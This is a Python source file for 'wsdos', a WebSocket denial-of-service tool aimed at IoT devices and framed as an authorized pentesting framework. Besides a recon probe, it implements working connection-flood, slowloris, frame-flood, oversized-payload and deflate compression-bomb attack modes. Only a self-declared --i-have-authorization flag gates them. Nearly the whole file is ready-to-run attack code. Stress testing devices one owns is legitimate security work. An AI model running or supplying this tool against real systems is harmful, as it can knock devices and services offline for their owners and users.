#!/usr/bin/env python3
"""
wsdos: WebSocket stress-test framework for IoT pentesting.

Authorized testing only. The --i-have-authorization flag is required
to actually run attack modes against a target. Use against systems you
own or have explicit written permission to test.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import random
import signal
import ssl
import string
import sys
import time
from contextlib import suppress
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse

try:
    import websockets
    from websockets.exceptions import (
        ConnectionClosed,
        InvalidHandshake,
        InvalidStatusCode,
        WebSocketException,
    )
except ImportError:
    sys.stderr.write(
        "error: the 'websockets' package is required.\n"
        "       install with: pip install -r requirements.txt\n"
    )
    sys.exit(2)


VERSION = "2.0.0"
BANNER = rf"""
 __      _____  ___   ___  ___
 \ \    / / __||   \ / _ \/ __|
  \ \/\/ /\__ \| |) | (_) \__ \
   \_/\_/ |___/|___/ \___/|___/  v{VERSION}
 WebSocket stress-test for IoT devices  |  github.com/V33RU/wsdos-iotdevice
"""

LEGAL = (
    "Authorized testing only. By using this tool you confirm you have "
    "explicit permission to test the target. Misuse is your responsibility."
)


# ----------------------------------------------------------------------
# Metrics
# ----------------------------------------------------------------------


@dataclass
class Metrics:
    started_at: float = field(default_factory=time.monotonic)
    connections_attempted: int = 0
    connections_open: int = 0
    connections_peak: int = 0
    connections_failed: int = 0
    handshake_rejects: int = 0
    bytes_sent: int = 0
    frames_sent: int = 0
    errors_by_type: dict = field(default_factory=dict)
    last_error: str = ""

    def conn_opened(self) -> None:
        self.connections_open += 1
        self.connections_peak = max(self.connections_peak, self.connections_open)

    def conn_closed(self) -> None:
        self.connections_open = max(0, self.connections_open - 1)

    def record_error(self, exc: BaseException) -> None:
        name = type(exc).__name__
        self.errors_by_type[name] = self.errors_by_type.get(name, 0) + 1
        self.last_error = f"{name}: {exc}"

    def elapsed(self) -> float:
        return time.monotonic() - self.started_at

    def snapshot(self) -> dict:
        return {
            "elapsed_s": round(self.elapsed(), 2),
            "attempted": self.connections_attempted,
            "open_now": self.connections_open,
            "peak_open": self.connections_peak,
            "failed": self.connections_failed,
            "handshake_rejects": self.handshake_rejects,
            "bytes_sent": self.bytes_sent,
            "frames_sent": self.frames_sent,
            "errors_by_type": dict(self.errors_by_type),
        }


METRICS = Metrics()
STOPPING = asyncio.Event()


# ----------------------------------------------------------------------
# URL & target helpers
# ----------------------------------------------------------------------


def normalize_target(raw: str, port: Optional[int], path: str, tls: bool) -> str:
    """Accept '1.2.3.4', '1.2.3.4:8080', or 'ws://host/path' forms."""
    if raw.startswith(("ws://", "wss://")):
        return raw
    scheme = "wss" if tls else "ws"
    if ":" in raw and not raw.startswith("["):
        host = raw
    elif port:
        host = f"{raw}:{port}"
    else:
        host = raw
    return f"{scheme}://{host}{path}"


def random_ws_key() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=22)) + "=="


def build_ssl_context(insecure: bool) -> Optional[ssl.SSLContext]:
    if not insecure:
        return None
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ----------------------------------------------------------------------
# Recon
# ----------------------------------------------------------------------


async def probe(url: str, ssl_ctx, headers: dict, timeout: float) -> dict:
    """Probe a target: connect once, capture handshake result and basic info."""
    info = {"url": url, "ok": False, "rtt_ms": None, "subprotocol": None,
            "headers_seen": {}, "error": None}
    start = time.monotonic()
    try:
        async with websockets.connect(
            url,
            ssl=ssl_ctx if url.startswith("wss://") else None,
            extra_headers=list(headers.items()) if headers else None,
            close_timeout=timeout,
            open_timeout=timeout,
            ping_interval=None,
        ) as ws:
            info["ok"] = True
            info["rtt_ms"] = round((time.monotonic() - start) * 1000, 2)
            info["subprotocol"] = ws.subprotocol
            if ws.response_headers:
                for k in ("Server", "Sec-WebSocket-Protocol",
                          "Sec-WebSocket-Extensions"):
                    v = ws.response_headers.get(k)
                    if v:
                        info["headers_seen"][k] = v
    except Exception as exc:  # noqa: BLE001
        info["error"] = f"{type(exc).__name__}: {exc}"
    return info


# ----------------------------------------------------------------------
# Attack modes
# ----------------------------------------------------------------------


async def _open_one(url: str, ssl_ctx, headers, timeout: float):
    METRICS.connections_attempted += 1
    try:
        ws = await websockets.connect(
            url,
            ssl=ssl_ctx if url.startswith("wss://") else None,
            extra_headers=list(headers.items()) if headers else None,
            open_timeout=timeout,
            close_timeout=1,
            ping_interval=None,
            max_size=None,
        )
        METRICS.conn_opened()
        return ws
    except (InvalidStatusCode, InvalidHandshake):
        METRICS.handshake_rejects += 1
        return None
    except Exception as exc:  # noqa: BLE001
        METRICS.connections_failed += 1
        METRICS.record_error(exc)
        return None


async def mode_flood(args) -> None:
    """Open as many concurrent WebSocket connections as possible and hold them."""
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)
    sem = asyncio.Semaphore(args.concurrency)
    holders = []

    async def worker():
        async with sem:
            ws = await _open_one(url, ssl_ctx, headers, args.timeout)
            if ws is None:
                return
            holders.append(ws)
            try:
                await STOPPING.wait()
            finally:
                with suppress(Exception):
                    await ws.close()
                METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.count)]
    await _run_with_duration(tasks, args.duration)


async def mode_slowloris(args) -> None:
    """Slowloris-style: open many connections, dribble a frame every N seconds."""
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)

    async def worker():
        ws = await _open_one(url, ssl_ctx, headers, args.timeout)
        if ws is None:
            return
        try:
            while not STOPPING.is_set():
                # Single-byte text frame keeps the conn "active" but barely
                payload = random.choice(string.ascii_lowercase)
                try:
                    await ws.send(payload)
                    METRICS.frames_sent += 1
                    METRICS.bytes_sent += 1
                except ConnectionClosed:
                    return
                except Exception as exc:  # noqa: BLE001
                    METRICS.record_error(exc)
                    return
                await asyncio.sleep(args.interval)
        finally:
            with suppress(Exception):
                await ws.close()
            METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.count)]
    await _run_with_duration(tasks, args.duration)


async def mode_frame_flood(args) -> None:
    """Single connection blasting frames as fast as possible."""
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)
    payload = random.choices(string.printable, k=args.payload_size)
    payload = "".join(payload)

    async def worker():
        ws = await _open_one(url, ssl_ctx, headers, args.timeout)
        if ws is None:
            return
        try:
            while not STOPPING.is_set():
                try:
                    await ws.send(payload)
                    METRICS.frames_sent += 1
                    METRICS.bytes_sent += len(payload)
                except ConnectionClosed:
                    return
                except Exception as exc:  # noqa: BLE001
                    METRICS.record_error(exc)
                    return
        finally:
            with suppress(Exception):
                await ws.close()
            METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.workers)]
    await _run_with_duration(tasks, args.duration)


async def mode_payload(args) -> None:
    """Send oversized payload frames to stress framing/buffers."""
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)
    payload = "A" * args.payload_size

    async def worker():
        ws = await _open_one(url, ssl_ctx, headers, args.timeout)
        if ws is None:
            return
        try:
            count = 0
            while not STOPPING.is_set() and (args.frames == 0 or count < args.frames):
                try:
                    await ws.send(payload)
                    METRICS.frames_sent += 1
                    METRICS.bytes_sent += len(payload)
                    count += 1
                except ConnectionClosed:
                    return
                except Exception as exc:  # noqa: BLE001
                    METRICS.record_error(exc)
                    return
                await asyncio.sleep(args.interval)
        finally:
            with suppress(Exception):
                await ws.close()
            METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.workers)]
    await _run_with_duration(tasks, args.duration)


async def mode_compression(args) -> None:
    """
    Compression-bomb style: send highly compressible payloads when the server
    advertises permessage-deflate, forcing CPU/memory pressure on the decoder.
    """
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)
    payload = "A" * args.payload_size  # ratio ~1000:1 with deflate

    async def worker():
        METRICS.connections_attempted += 1
        try:
            ws = await websockets.connect(
                url,
                ssl=ssl_ctx if url.startswith("wss://") else None,
                extra_headers=list(headers.items()) if headers else None,
                compression="deflate",
                open_timeout=args.timeout,
                close_timeout=1,
                ping_interval=None,
                max_size=None,
            )
            METRICS.conn_opened()
        except Exception as exc:  # noqa: BLE001
            METRICS.connections_failed += 1
            METRICS.record_error(exc)
            return
        try:
            while not STOPPING.is_set():
                try:
                    await ws.send(payload)
                    METRICS.frames_sent += 1
                    METRICS.bytes_sent += len(payload)
                except ConnectionClosed:
                    return
                except Exception as exc:  # noqa: BLE001
                    METRICS.record_error(exc)
                    return
        finally:
            with suppress(Exception):
                await ws.close()
            METRICS.conn_closed()

    tasks = [asyncio.create_task(worker()) for _ in range(args.workers)]
    await _run_with_duration(tasks, args.duration)


# ----------------------------------------------------------------------
# Runner helpers
# ----------------------------------------------------------------------


async def _run_with_duration(tasks, duration: float) -> None:
    if duration > 0:
        async def stopper():
            await asyncio.sleep(duration)
            STOPPING.set()
        tasks.append(asyncio.create_task(stopper()))
    await asyncio.gather(*tasks, return_exceptions=True)


def parse_headers(items) -> dict:
    out = {}
    for item in items or []:
        if ":" not in item:
            raise SystemExit(f"bad --header {item!r}, expected 'Name: value'")
        k, _, v = item.partition(":")
        out[k.strip()] = v.strip()
    return out


async def metrics_printer(interval: float, json_out: bool) -> None:
    """Print live metrics until STOPPING is set."""
    while not STOPPING.is_set():
        await asyncio.sleep(interval)
        snap = METRICS.snapshot()
        if json_out:
            print(json.dumps(snap), flush=True)
        else:
            sys.stderr.write(
                f"\r[{snap['elapsed_s']:>6.1f}s] "
                f"open={snap['open_now']:>5} "
                f"peak={snap['peak_open']:>5} "
                f"attempted={snap['attempted']:>6} "
                f"failed={snap['failed']:>5} "
                f"reject={snap['handshake_rejects']:>4} "
                f"frames={snap['frames_sent']:>6} "
                f"bytes={snap['bytes_sent']:>9}   "
            )
            sys.stderr.flush()


def install_signal_handlers(loop):
    def _stop(*_):
        if not STOPPING.is_set():
            sys.stderr.write("\n[!] stop signal received, draining...\n")
            STOPPING.set()
    with suppress(NotImplementedError):
        loop.add_signal_handler(signal.SIGINT, _stop)
        loop.add_signal_handler(signal.SIGTERM, _stop)


# ----------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------


def make_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="wsdos",
        description="WebSocket stress-test for IoT devices (authorized testing).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=LEGAL,
    )
    p.add_argument("--version", action="version", version=f"wsdos {VERSION}")
    sub = p.add_subparsers(dest="mode", required=True, metavar="MODE")

    # common flags
    def add_common(sp, needs_consent=True):
        sp.add_argument("target", help="Target host, host:port, or full ws[s]:// URL")
        sp.add_argument("-p", "--port", type=int, default=None,
                        help="Port (when target is a bare host)")
        sp.add_argument("--path", default="/", help="WebSocket path (default '/')")
        sp.add_argument("-s", "--tls", action="store_true",
                        help="Use wss:// even if target is bare host")
        sp.add_argument("-k", "--insecure", action="store_true",
                        help="Skip TLS verification for self-signed certs")
        sp.add_argument("-H", "--header", action="append",
                        help="Extra header 'Name: value' (repeatable)")
        sp.add_argument("-t", "--timeout", type=float, default=10.0,
                        help="Per-connection handshake timeout (s)")
        sp.add_argument("-d", "--duration", type=float, default=0,
                        help="Stop after N seconds (0 = until Ctrl+C)")
        sp.add_argument("--report-every", type=float, default=1.0,
                        help="Live-metrics interval (s)")
        sp.add_argument("--json", action="store_true",
                        help="Emit metrics as JSON lines (stdout)")
        if needs_consent:
            sp.add_argument("--i-have-authorization", action="store_true",
                            help="Required acknowledgement for live attack modes")

    # probe (recon, no consent required, single connection)
    sp_probe = sub.add_parser("probe", help="Recon a target (single handshake, no flood)")
    add_common(sp_probe, needs_consent=False)
    sp_probe.set_defaults(func=cmd_probe)

    sp_flood = sub.add_parser("flood",
        help="Open many concurrent connections and hold (classic).")
    add_common(sp_flood)
    sp_flood.add_argument("-n", "--count", type=int, default=1000,
                          help="Target number of concurrent connections")
    sp_flood.add_argument("-c", "--concurrency", type=int, default=200,
                          help="Max simultaneous handshakes in flight")
    sp_flood.set_defaults(func=cmd_attack(mode_flood))

    sp_slow = sub.add_parser("slowloris",
        help="Open many connections and keep alive with tiny frames.")
    add_common(sp_slow)
    sp_slow.add_argument("-n", "--count", type=int, default=500,
                         help="Number of held connections")
    sp_slow.add_argument("-i", "--interval", type=float, default=15.0,
                         help="Seconds between keepalive frames")
    sp_slow.set_defaults(func=cmd_attack(mode_slowloris))

    sp_frame = sub.add_parser("frame-flood",
        help="Hammer the target with rapid small frames.")
    add_common(sp_frame)
    sp_frame.add_argument("-w", "--workers", type=int, default=10,
                          help="Concurrent connections sending frames")
    sp_frame.add_argument("--payload-size", type=int, default=64,
                          help="Bytes per frame")
    sp_frame.set_defaults(func=cmd_attack(mode_frame_flood))

    sp_pay = sub.add_parser("payload",
        help="Send oversized frames to stress framing/buffers.")
    add_common(sp_pay)
    sp_pay.add_argument("-w", "--workers", type=int, default=5)
    sp_pay.add_argument("--payload-size", type=int, default=1_048_576,
                        help="Bytes per frame (default 1 MiB)")
    sp_pay.add_argument("--frames", type=int, default=0,
                        help="Stop after N frames per worker (0 = unlimited)")
    sp_pay.add_argument("-i", "--interval", type=float, default=0,
                        help="Pause between frames per worker")
    sp_pay.set_defaults(func=cmd_attack(mode_payload))

    sp_zip = sub.add_parser("compression",
        help="permessage-deflate amplification (highly compressible payloads).")
    add_common(sp_zip)
    sp_zip.add_argument("-w", "--workers", type=int, default=5)
    sp_zip.add_argument("--payload-size", type=int, default=10 * 1024 * 1024,
                        help="Bytes per (compressed) frame, default 10 MiB")
    sp_zip.set_defaults(func=cmd_attack(mode_compression))

    return p


def cmd_attack(handler):
    """Wrap a mode handler with the consent gate and metrics loop."""
    async def runner(args):
        if not args.i_have_authorization:
            sys.stderr.write(
                "refused: pass --i-have-authorization to confirm you have\n"
                "         explicit permission to test the target.\n"
            )
            sys.exit(3)
        sys.stderr.write(BANNER + "\n" + LEGAL + "\n\n")
        await asyncio.sleep(0.5)
        loop = asyncio.get_running_loop()
        install_signal_handlers(loop)
        printer = asyncio.create_task(
            metrics_printer(args.report_every, args.json)
        )
        try:
            await handler(args)
        finally:
            STOPPING.set()
            printer.cancel()
            with suppress(asyncio.CancelledError):
                await printer
            sys.stderr.write("\n")
            print(json.dumps({"final": METRICS.snapshot()}, indent=2))
    return runner


async def cmd_probe(args):
    url = normalize_target(args.target, args.port, args.path, args.tls)
    ssl_ctx = build_ssl_context(args.insecure)
    headers = parse_headers(args.header)
    info = await probe(url, ssl_ctx, headers, args.timeout)
    print(json.dumps(info, indent=2))


def main(argv=None) -> None:
    parser = make_parser()
    args = parser.parse_args(argv)
    try:
        asyncio.run(args.func(args))
    except KeyboardInterrupt:
        sys.exit(130)


if __name__ == "__main__":
    main()
